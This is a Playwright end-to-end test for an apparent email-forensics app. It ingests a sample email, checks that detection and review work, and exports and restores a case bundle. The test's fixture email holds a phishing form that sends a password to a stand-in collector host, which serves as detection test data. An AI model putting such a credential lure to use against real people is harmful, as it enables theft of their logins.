import { expect, test } from '@playwright/test'
import { readFile } from 'node:fs/promises'

test('built app hashes and ingests mail, detects it, reviews it and restores its backup', async ({ page }, testInfo) => {
  // Exercise the disk-streamed download fallback as well as the worker's production CSP.
  await page.addInitScript(() => {
    Object.defineProperty(window, 'showSaveFilePicker', { value: undefined })
  })
  await page.goto('/')
  await page.getByText('Evidence', { exact: true }).first().click()
  const mail = [
    'From: Supplier <reports@vendor.example>',
    'To: Alice <alice@northstar.example>',
    'Date: Mon, 7 Sep 2026 10:00:00 +0000',
    'Subject: Browser regression credential lure',
    'MIME-Version: 1.0',
    'Content-Type: text/html; charset=utf-8',
    '',
    '<html><form action="https://collector.example/submit"><input type="password" name="password"><button>Open invoice</button></form></html>',
  ].join('\r\n')
  await page
    .locator('input[type=file]')
    .first()
    .setInputFiles({ name: 'regression.eml', mimeType: 'message/rfc822', buffer: Buffer.from(mail) })
  await expect(page.locator('tr').filter({ hasText: 'regression.eml' })).toContainText('done', { timeout: 90_000 })
  await page.getByText('Review', { exact: true }).first().click()
  const review = page.getByRole('button', { name: 'reviewed', exact: true }).first()
  await expect(review).toBeVisible({ timeout: 60_000 })
  await review.click()
  await page.getByText('Report', { exact: true }).first().click()
  const downloaded = page.waitForEvent('download')
  await page.getByRole('button', { name: /export case bundle/ }).click()
  const file = await downloaded
  const target = testInfo.outputPath('case.remn.ndjson')
  await file.saveAs(target)
  const content = await readFile(target, 'utf8')
  expect(content).toContain('"status":"reviewed"')
  expect(content).toContain('"sha256":')
  await page.locator('input[type=file]').last().setInputFiles(target)
  await expect(page.getByText(/case imported/)).toBeVisible({ timeout: 60_000 })
})
